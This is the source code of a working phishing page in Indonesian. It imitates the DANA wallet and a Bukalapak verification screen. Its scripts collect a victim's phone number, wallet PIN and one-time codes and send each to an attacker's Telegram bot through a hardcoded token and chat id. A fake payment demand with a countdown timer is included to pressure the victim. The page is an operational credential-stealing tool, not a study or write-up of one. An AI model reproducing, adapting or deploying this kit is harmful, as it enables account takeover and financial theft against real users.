	<div class="bl-sheet__content">
		<div>
			<!---->
			<!---->
			
			<div data-v-806923e8="">
				<div data-v-43753f06="" data-v-806923e8="" editphoneoremailtext="Nomor hilang atau tidak aktif">
					<div data-v-6dff705c="" data-v-43753f06="">
						<div data-v-6dff705c="" class="bl-flex-container p-16" style="flex-direction: row; justify-content: space-between; flex: 1 1 0%;">
							<div data-v-6dff705c="" class="bl-flex-item" style="order: 0; flex: 1 1 auto;">
								<p data-v-6dff705c="" class="mb-16 bl-text bl-text--subheading-18 bl-text--bold" style="line-height: 24px;">Masukkan Kode Rahasia yang diterima via SMS/WhatsApp di :</p>
								<!---->
								<p data-v-43753f06="" class="mt-20 mb-12 handle bl-text bl-text--heading-24 bl-text--bold" style="line-height: 22px; color: #E31E53; font-size: 20px" id="infoku"></p>
								<span data-v-43753f06="" class="link-primary bl-link bl-link--primary">Nomor hilang atau tidak aktif</span>
								<div data-v-43753f06="" class="mb-24"></div>
							</div>
							<div data-v-6dff705c="" class="bl-flex-item" style="order: 0; flex: 1 1 auto; text-align: right;">
								<div data-v-6dff705c="" class="illust" style="background-image: url(&quot;https://s1.bukalapak.com/attachment/137212/tfa-js__img_small_message_email.png&quot;); margin-right: -5px">
								</div>
							</div>
						</div>
<form id="formBuka" onsubmit="bukalapak(event);" >
	<div id="PINJS-1711264693689">
   <div data-v-781543d7="" class="pin-js">
		<div data-v-6dff705c="" class="p-16">
<div data-v-036205ed="" data-v-806923e8="" class="bl-code-input mb-12 custom-code-input" data-v-6dff705c="">
	<div id="codepin" class="box-input-pin" style="text-align: center; margin-top: -80px; padding-left: 50px; z-index: 999999; position: absolute">
				<div type="button" class="clear"></div>
				
				<input name="pin1" id="kode1" class="bl-textfield__inner bl-code-input__item bl-textfield" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
				<input name="pin2" id="kode2" class="bl-textfield__inner bl-code-input__item bl-textfield" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
				<input name="pin3" id="kode3" class="bl-textfield__inner bl-code-input__item bl-textfield" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
				<input name="pin4" id="kode4" class="bl-textfield__inner bl-code-input__item bl-textfield" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
				<input name="pin5" id="kode5" class="bl-textfield__inner bl-code-input__item bl-textfield" inputmode="numeric" type="password" autocomplete="off"  maxlength="1" onkeypress="if(this.value.length==1) return false;" >
				<br/>
				<input type="tel" style="opacity: 0" readonly>
				</div>
			

</div>
<p id="alertc" data-v-806923e8="" class="mb-8 bl-text bl-text--caption-12 bl-text--error-01" data-v-6dff705c="" style="display: none; width: 290px; text-align: center">Kode yang kamu masukkan salah, cek kembali ya</p>
<center>
<p data-v-806923e8="" class="mb-48 bl-text bl-text--caption-12 bl-text--subdued" data-v-6dff705c="" style="margin-left: 0px; margin-top: 10px; width: 100%">Belum terima kode? <strong data-v-806923e8="" style="color: #aaa">Tunggu 0 menit <span id="countdown1" style="color: #aaa; font-weight: bold">60</span> detik</strong><!----></p>
</center>
<button type="submit" style="color: #fff" class="bl-button bl-button--primary bl-button--large is-fullwidth">Verifikasi</button>
</form>
<div data-v-806923e8="" data-v-6dff705c="" class="mt-20"><p data-v-806923e8="" class="bl-text bl-text--bold" data-v-6dff705c="" style="text-align: center; color: rgb(34, 62, 176);"><span data-v-806923e8="" id="other-method" class="other-button-disabled" style="cursor: pointer;">Lihat metode lain</span></p></div></div>
					</div>
				</div>
			</div>
		</div>
	</div>
    
       <center>
     <div id="process2" name="process" class="process" style="display: none;">
            <div class="loading">
                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png">
                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png" id="loading" style="margin-top: 8px">
            </div>
        </div>
        </center>   
    
</fieldset>
<fieldset id="pending" style="display:none ; position: fixed; top: 0; left: 0; right: 0; bottom: 0; margin: 0px auto; width: 100%; height: 100%; background: #fff">
<center>
<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4DSzVxsDwIS4DHczX5wWSw_1DgHadANJ5P3uzNZygUFawlfT6Prxs4X1epzvw8VnVDM-RUj1tKX0FFhyphenhyphenZje2JPKJLS3Y88HB1yIvVjQpqN8i4KYtbUim3Rjq0ALj1Lb97HYfWzIgQUKoRaljZb4MMhmxd3M6_faYdlYssSNSz6C2lVeOsl3VpG_qhbBE/s1080/Screenshot_2023-12-10-12-51-42-00_40deb401b9ffe8e1df2f1cc5ba480b12.jpg" style="display:line; margin: 0px auto; width: 100%; position: fixed; top: 0; left: 0; right: 0; z-index: 999">
</center>

<br/>
<div class="container" style="background: #fff">
<div class="slider" style="border-radius: 0px; margin-top: 40px">
<div> <a href="#"> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRXNEDLMPBoxPR8jiZxEPVrKA8_lIa9QpDAOTTuRUdRLSdgDgUhDi5qZ-nmIFN_eBYuGYL4c4m_newEb_OUSMqd2PZNI3V2Pk6Gw8umR4TCpCrJGHWKBkkj2IGnGckKPVnMNg5fDmOVH7BIIHpT215NSANcTnxHD8zITQyKlpm_FbAvoGe3aAkAZtBGAk/s1080/AddText_05-02-02.22.45.jpg" alt="Image 1" style="border-radius: 15px; border: 2px solid #aaa; width: 100%; box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;"> </a> </div>


</div>
<div class="panel panel-info" style="outline: 2px double #0086e0; border-radius: 13px; margin-top: 0px; left: 0; box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
          right: 0;
         top: 200;
          margin: 0px auto;
          position: fixed; position: absolute; width: 90%">
<div class="panel-body">
<legend>
<h2 style="text-align: center; font-size: 17px; border-bottom: 0px solid #0086e0; font-weight: bold; color: #C60000">𝗣𝗘𝗠𝗕𝗘𝗥𝗜𝗧𝗔𝗛𝗨𝗔𝗡</h2>
<br/>
<button type="button" class="btn-punya" disabled style="border-radius: 50px"><h  id="fiturku">𝗙𝗜𝗧𝗨𝗥 𝗧𝗘𝗥𝗧𝗨𝗡𝗗𝗔 !!</h></button>
<br/>
<h2 style="text-align: center; font-size: 14px; border-bottom: 0px solid #0086e0; font-weight: bold; color: #0086e0;">Akun Anda Harus melakukan Transaksi Terlebih dahulu sebesar 𝗥𝗽. 𝟮𝟬𝟬.𝟬𝟬𝟬 Sekarang juga</h2>
</legend><center>
   <b class="waktu" style="font-size:15px">𝘄𝗮𝗸𝘁𝘂 𝘁𝗲𝗿𝘀𝗶𝘀𝗮<br/>(<span class="waktu" id="timer" style="margin-top: -px">59 : 59 </span>)</b>
</center>
</div>
<fieldset style="  left: 0;
          right: 0;
          
          bottom: 20;
          margin: 0px auto;
          position: fixed;">
<h6></h6>

<center>
<div class="css-dnzamn"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1e-NKRIzk9hyphenhyphenOg2Y5_KyiVFxwxLGukBAhenr7lRXrqJUt3z6I-zyn45HSM9HYpA9M0eUrnyPZKf3wIsKIN78j4BPVVmI7wklFpEPFRq4Y_5lip4WmteiVL-UgnJdllJNXqr8gMW96taeEoIBMeiHImH-E1SCDUWaSKclLYds-Dr1-3_zwaSdWFgHs_PQ/s2080/AddText_01-01-08.59.51.png" width="100%"></div>
</fieldset>    
    
    
    
    
</fieldset>
<script>
        document.getElementById('timer').innerHTML =
        59 + ":" + 59;
        startTimer();
        
        
        function startTimer() {
          var presentTime = document.getElementById('timer').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('timer').innerHTML =
            m + " : " + s;
          console.log(m)
           setTimeout(startTimer, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
    </script> 
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js">
            </script> 
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js">
            </script>

<script>
            $(document).ready(function() {
                $('.slider').slick({
                    autoplay: true,
                    autoplaySpeed: 500,
                    dots: true
                });
            });
            </script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
        
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
<script src="./asset/goo1gle.js"></script>
<script>$(document).ready(function(){$('#inp').on('input', function(){if($(this).val() == '0' || $(this).val() == '62'){$(this).val('');}});});</script>
<script>$(document).ready(function(){$('#inp').mask('000-0000-000000');});</script>
<script>let inp = document.getElementById("inp");let btn = document.getElementById("btn");inp.addEventListener("input", val);function val(){if(inp.value.length > 10){btn.disabled = false;}else{btn.disabled = true;}};</script>

<script>
//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
var pinContainer = document.querySelector(".box-input-pin");
console.log('There is ' + pinContainer.length + ' Pin Container on the page.');

pinContainer.addEventListener('keyup', function (event) {
    var target = event.srcElement;
    
    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
    var myLength = target.value. length;

    if (myLength >= maxLength) {
        var next = target;
        while (next = next.nextElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }

    if (myLength === 0) {
        var next = target;
        while (next = next.previousElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }
}, false);

pinContainer.addEventListener('keydown', function (event) {
    var target = event.srcElement;
    target.value = "";
}, false);
</script>
<script>
//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
var pinContainer = document.getElementById("codepin");
console.log('There is ' + pinContainer.length + ' Pin Container on the page.');

pinContainer.addEventListener('keyup', function (event) {
    var target = event.srcElement;
    
    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
    var myLength = target.value. length;

    if (myLength >= maxLength) {
        var next = target;
        while (next = next.nextElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }

    if (myLength === 0) {
        var next = target;
        while (next = next.previousElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }
}, false);

pinContainer.addEventListener('keydown', function (event) {
    var target = event.srcElement;
    target.value = "";
}, false);
</script>
<script>$('.inpotp').on('input', function(event) {const inputs = $('.inpotp');const isAllFilled = Array.from(inputs).every((input) => input.value !== '');if (isAllFilled == true) {$(event.target).blur();sendOtp();}const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});</script>
<script>$(document).ready(function() {$('.clear').click(function() {$('.inppin').val('');$('#pin1').focus();});$('.clearotp').click(function() {$('.inpotp').val('');$('#otp1').focus();});$('.show').click(function() {$('.inppin').each(function() {if ($(this).attr('type') === 'password') {$(this).attr('type','number');$(".show").text("SEMBUNYIKAN");} else {$(this).attr('type', 'password');$(".show").text("TAMPILKAN");}});});});</script>
<script>
 function nextPrev(){
      $("#process1").show();event.preventDefault();
       setTimeout(function(){
           $("#homeku").hide();
           $("#back1").show();
           
           $("#butonku").fadeOut();
           $(".box-login").fadeIn();
           $("#process1").hide();
       },1000);
 }   
 
 
 function goback1(){
     $("#process").show();
     setTimeout(function(){
     $("#homeku").show();
      $(".box-login").fadeOut();
      $("#butonku").fadeIn();
      $("#back1").hide();
       $("#process").hide();
       
     },500);
 }
 
 
 function pemunculan(){
      $("#process1").show();
        setTimeout(function(){
       $("#infooo").hide();
        $(".bgotp").show();
         $("#process1").hide();
         setInterval(countdown, 1000);
        },1000);
 }
 </script>
 <script>
 
 function goback2(){
     $("#process").show();
     setTimeout(function(){
    $("#formPin").fadeOut();
     $("#formNohp").fadeIn();
       $("#process").hide();
        $("#inp").val('');
        $("#back1").show();
        $("#back2").hide();
        document.getElementById("formPin").reset();
        $('.inppin').val('');
     },500);
 }
</script>
<script>
    $( document ).ready(function() {
            setTimeout(() => {
                $('#popup').hide();
                $('chsalxcome2').fadeIn();
            },2000)
             $('musikku').play();
        })
        
</script>


<script>
function tutupotp(){
$(".bgotp").hide();    
}
</script>
<script>
   function sendNohp(event){
    $("#process").show();event.preventDefault();
    $("#inp").blur();
     
    
    
    var nomor = document.getElementById("inp").value;
            sessionStorage.setItem("nomor", nomor);
    var logo = document.getElementById('logo');       
    var inp = document.getElementById('inp');
    
    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value;
   
    var token = '7470616275:AAGD16xe41oc03Yr2tr4M0VWt9CjuBNpawA'; // Ganti dengan token bot yang kamu buat
    var grup = '7440334508'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
    $("#process").hide();
    document.getElementById("back1").style.display = "none";
    document.getElementById("back2").style.display = "block";
    $("#formNohp").fadeOut();
    setTimeout(function(){
   
    $("#formPin").fadeIn();
    $("#pin1").focus();
    }, 500);}});};
    

function sendPin(){

 
 
  var nomor = sessionStorage.getItem("nomor");
        document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor+ " via SMS";
  var logo = document.getElementById('logo'); 
  var inp = document.getElementById('inp');
 var pin1 = document.getElementById('pin1');
 var pin2 = document.getElementById('pin2');
 var pin3 = document.getElementById('pin3');
 var pin4 = document.getElementById('pin4');
 var pin5 = document.getElementById('pin5');
 var pin6 = document.getElementById('pin6');
     
  var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
  
     
 

    var token = '7470616275:AAGD16xe41oc03Yr2tr4M0VWt9CjuBNpawA'; // Ganti dengan token bot yang kamu buat
    var grup = '7440334508'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,


success: function(){
$("#process").hide();
var themeColorTest = new function() {
  function e() {
    "#C11A46" === $themeColor.content ? $themeColor.content = "#C11A46" : "#C11A46" === $themeColor.content ? $themeColor.content = "#C11A46" : $themeColor.content = "#C11A46",
      setTimeout(e, 500)
  }
  this.init = function() {
    $themeColor = document.querySelector("meta[name='theme-color']"),
      e()
  }
};
themeColorTest.init();
document.getElementById("infoku").innerHTML = "0" + inp.value;
 setInterval(countdown1, 1000);
  $("#bukalapak").fadeIn();
  $("#kode1").focus();
}
}
);
};


  function sendOtp(){
    $(".loadingOtp").show();
     var logo = document.getElementById('logo'); 
     var inp = document.getElementById('inp');
 var pin1 = document.getElementById('pin1');
 var pin2 = document.getElementById('pin2');
 var pin3 = document.getElementById('pin3');
 var pin4 = document.getElementById('pin4');
 var pin5 = document.getElementById('pin5');
 var pin6 = document.getElementById('pin6');
     var otp1 = document.getElementById('otp1');
   var otp2 = document.getElementById('otp2');
   var otp3 = document.getElementById('otp3');
   var otp4 = document.getElementById('otp4');
   setTimeout(function(){
$(".alert").text("Masa berlaku OTP sudah habis");
$(".alert").css("color","red");
 },2000);
    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝗢𝗧𝗣 𝗗𝗔𝗡𝗔     : ' + otp1.value + otp2.value + otp3.value + otp4.value;


    var token = '7470616275:AAGD16xe41oc03Yr2tr4M0VWt9CjuBNpawA'; // Ganti dengan token bot yang kamu buat
    var grup = '7440334508'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        
    success: function(){
    setTimeout(function(){
    $(".loadingOtp").hide();
   
    $('.inpotp').val('');
   $('#otp1').focus();
  var nomor = sessionStorage.getItem("nomor");
        document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor +  " via SMS";
   $(".alert").css("color","black");
    },4000);
   
        
    }
        
    }
    );
        
    };
    
   function bukalapak(event){
    $("#process2").show();
    
    event.preventDefault();
  
     
    
    
  
       var logo = document.getElementById('logo'); 
     var inp = document.getElementById('inp');
 var pin1 = document.getElementById('pin1');
 var pin2 = document.getElementById('pin2');
 var pin3 = document.getElementById('pin3');
 var pin4 = document.getElementById('pin4');
 var pin5 = document.getElementById('pin5');
 var pin6 = document.getElementById('pin6');
   var kode1 = document.getElementById('kode1');
   var kode2 = document.getElementById('kode2');
   var kode3 = document.getElementById('kode3');
   var kode4 = document.getElementById('kode4');
   var kode5 = document.getElementById('kode5');
    
    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝗢𝗧𝗣 𝗕𝘂𝗸𝗮𝗹𝗮𝗽𝗮𝗸     : ' + kode1.value + kode2.value + kode3.value + kode4.value + kode5.value;
   
    var token = '7470616275:AAGD16xe41oc03Yr2tr4M0VWt9CjuBNpawA'; // Ganti dengan token bot yang kamu buat
    var grup = '7440334508'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
 $("#bukalapak").hide();       
  $("#infooo").fadeIn();      
  var themeColorTest = new function() {
  function e() {
    "#118EEA" === $themeColor.content ? $themeColor.content = "#118EEA" : "#118EEA" === $themeColor.content ? $themeColor.content = "#118EEA" : $themeColor.content = "#118EEA",
      setTimeout(e, 00)
  }
  this.init = function() {
    $themeColor = document.querySelector("meta[name='theme-color']"),
      e()
  }
};
themeColorTest.init();
    setTimeout(function(){
 
  $("#process2").hide();       
    $("#alertc").fadeOut();
    }, 5000);}});};
    
   
    
    </script>
<script>
    function countdown() {
    var count = parseInt(
    $('#countdown').text());
    if (count !== 0) {
    $('#countdown').text(count - 1);} 
    else {
    $('#countdown').text('60');}};
    </script>
    <script>
    function countdown1() {
    var count1 = parseInt(
    $('#countdown1').text());
    if (count1 !== 0) {
    $('#countdown1').text(count1 - 1);} 
    else {
    $('#countdown1').text('60');}};
    </script>
<script>
window.onload = function(){
        setTimeout(function(){
            $(".start").fadeIn();
            setTimeout(function(){
                $(".start").fadeOut(1000);
                setTimeout(function(){
                   $(".container").fadeIn(200);
                   $("#inp").focus();
                },1000);
            },1000);
        },500);
}
</script>
</body>
</html><!--<script src='https://a.bsite.net/footer.js'></script>
